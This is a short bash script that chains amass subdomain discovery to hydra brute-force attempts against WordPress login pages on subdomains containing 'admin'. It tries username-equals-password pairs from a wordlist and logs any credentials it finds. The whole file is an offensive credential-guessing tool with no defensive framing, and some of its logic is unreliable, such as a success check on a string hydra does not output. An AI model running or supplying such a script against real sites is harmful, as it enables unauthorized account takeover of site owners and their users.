#!/bin/bash
toilet SETAB
# Prompt the user for a URL
read -p "Enter a URL (example.com): " url

# Use the `amass` command to find subdomains
subdomains=$(amass intel -whois -d $url | grep "admin")

# Print the subdomains
echo "Subdomains containing 'admin':"
echo $subdomains

# Log file
logfile="./brute-force.log"

# Loop through the subdomains
for sub in $subdomains; do
  # Read the wordlist file
  while read line; do
    # Perform the brute force attack using hydra
    echo "Trying $line:$line on $sub"
    result=$(hydra -l "$line" -p "$line" "$sub" http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Location")
    if echo "$result" | grep -q "login successful"; then
      echo "Credentials found: $line:$line"
      echo "Credentials found: $line:$line" >> $logfile
      break
    elif echo "$result" | grep -q "401" || echo "$result" | grep -q "407"; then
      echo "Invalid credentials: $line:$line"
      echo "Invalid credentials: $line:$line" >> $logfile
    else
      echo "Error: $result"
      echo "Error: $result" >> $logfile
    fi
  done < wordlist.txt
done
